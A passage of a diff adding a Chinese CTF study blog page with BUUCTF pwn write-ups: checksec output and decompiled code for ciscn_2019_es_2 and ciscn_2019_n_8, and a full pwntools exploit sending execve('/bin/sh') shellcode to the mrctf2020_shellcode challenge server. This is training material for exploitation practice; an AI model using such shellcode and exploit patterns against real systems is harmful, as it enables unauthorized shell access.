class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="8-ciscn-2019-es-2"><a href="#8-ciscn-2019-es-2" class="headerlink" title="8.ciscn_2019_es_2"></a>8.ciscn_2019_es_2</h2><p>reference:<a target="_blank" rel="noopener" href="https://blog.csdn.net/cyy001128/article/details/146882575?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%A0%88%E8%BF%81%E7%A7%BB&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-146882575.142%5Ev102%5Epc_search_result_base7">栈迁移学习-CSDN博客</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766237987073-6e13a93e-9297-4897-b860-d0241d840290.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>考点：栈溢出-栈迁移</p>
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/E/CTF/pwn学习/BUUCTF/ciscn_2019_es_2/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file pwn</span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=88938f6e63cc4e27018f9032c4934e0a377712d1, not stripped</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">    vul();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里能发现存在栈溢出缓冲区是0x28字节，实际read函数能读0x30字节，相差8字节，只够覆盖返回函数，溢出空间不足，不能够shellcode，所以需要栈迁移；</p>
+<p>同时能发现后门函数：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766237750820-528ba9f9-e6c5-4ca1-acae-38fb067d3cc6.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<h2 id="undo8-ciscn-2019-n-8"><a href="#undo8-ciscn-2019-n-8" class="headerlink" title="undo8.ciscn_2019_n_8"></a>undo8.ciscn_2019_n_8</h2><figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [esp-14h] [ebp-20h]</span><br><span class="line">  int v5; // [esp-10h] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  n17 = 0;</span><br><span class="line">  init();</span><br><span class="line">  puts(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var, v4, v5);</span><br><span class="line">  <span class="keyword">if</span> ( n17 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( n17 == 17 )</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;something wrong! val is %d&quot;</span>,</span><br><span class="line">        var[0],</span><br><span class="line">        var[1],</span><br><span class="line">        var[2],</span><br><span class="line">        var[3],</span><br><span class="line">        var[4],</span><br><span class="line">        var[5],</span><br><span class="line">        var[6],</span><br><span class="line">        var[7],</span><br><span class="line">        var[8],</span><br><span class="line">        var[9],</span><br><span class="line">        var[10],</span><br><span class="line">        var[11],</span><br><span class="line">        var[12],</span><br><span class="line">        n17);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">    puts(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两个数组叠在一起了</p>
+<h2 id="10-mrctf2020-shellcode"><a href="#10-mrctf2020-shellcode" class="headerlink" title="10.mrctf2020_shellcode"></a>10.mrctf2020_shellcode</h2><figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/E/CTF/pwn学习/BUUCTF/mrctf2020_shellcode/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/54208227/1772886892248-ff5531f2-efc6-4202-9a78-e7d528a24075.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>没有办法反编译，ai了一下：</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 400h       ; nbytes = 1024 字节</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd = 0 (标准输入)</span><br><span class="line">...</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure>
+
+<p> 这里调用了 <code>read(0, buf, 0x400)</code>。 程序从标准输入读取最多 <code>0x400</code>（1024）个字节到栈上的 <code>buf</code> 中。  </p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loc_11D6:</span><br><span class="line">lea     rax, [rbp+buf]   ; 将 buf 的地址存入 rax</span><br><span class="line">call    rax              ; 【致命漏洞】直接将控制流转移到你的输入！</span><br></pre></td></tr></table></figure>
+
+<p>发一个shellcode即可:</p>
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="comment"># elf = ELF(r&quot;E:\CTF\pwn学习\BUUCTF\mrctf2020_shellcode\pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,29438)</span><br><span class="line">context(<span class="built_in">arch</span>=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+  </div>
+
+  <aside class="article-side">
+    <div class="card-panel sticky-panel">
+      <h3>Outline</h3>
+      
+        <div class="toc-shell"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#pwn"><span class="toc-list-text">pwn</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#1-warmup-csaw-2016"><span class="toc-list-text">1.warmup_csaw_2016</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#2-ciscn-2019-n-1"><span class="toc-list-text">2.ciscn_2019_n_1</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#3-pwn1-sctf-2016"><span class="toc-list-text">3.pwn1_sctf_2016</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#4-jarvisoj-level0"><span class="toc-list-text">4.jarvisoj_level0</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#5-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-list-text">5.[第五空间2019 决赛]PWN5</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#6-jarvisoj-level2"><span class="toc-list-text">6.jarvisoj_level2</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#undo7-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN1"><span class="toc-list-text">undo7.[Black Watch 入群题]PWN1</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#8-ciscn-2019-es-2"><span class="toc-list-text">8.ciscn_2019_es_2</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#undo8-ciscn-2019-n-8"><span class="toc-list-text">undo8.ciscn_2019_n_8</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#10-mrctf2020-shellcode"><span class="toc-list-text">10.mrctf2020_shellcode</span></a></li></ol></li></ol></div>
+      
+    </div>
+
+    
+      <div class="card-panel sticky-panel">
+        <h3>More from ctf</h3>
+        <div class="mini-list">
+          
+            <a href="/notes/ctf/_CTF/">
+              <strong>_CTF</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/_CTF/Week_1/">
+              <strong>Week_1</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/">
+              <strong>2025_SWPU-NSSCTF_秋季招新入门训练赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/%E8%BF%98%E5%9C%A8%E5%86%99%E3%80%82CopperSmith%E7%AE%97%E6%B3%95/">
+              <strong>还在写。CopperSmith算法</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+        </div>
+      </div>
+    
+  </aside>
+</article>
+
+      </main>
+      
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div>
+      <strong>JerryXie&#39;s Blog</strong>
+      <p>CTF, digital forensics, offensive security, and study notes.</p>
+    </div>
+    <div class="footer-meta">
+      <span>Hexo</span>
+      <span class="dot"></span>
+      <a href="https://github.com/JerryXie599/jerryxie599.github.io" target="_blank" rel="noopener">GitHub</a>
+      <span class="dot"></span>
+      <a href="https://jerryxie.top/" target="_blank" rel="noopener">Live</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </body>
+</html>
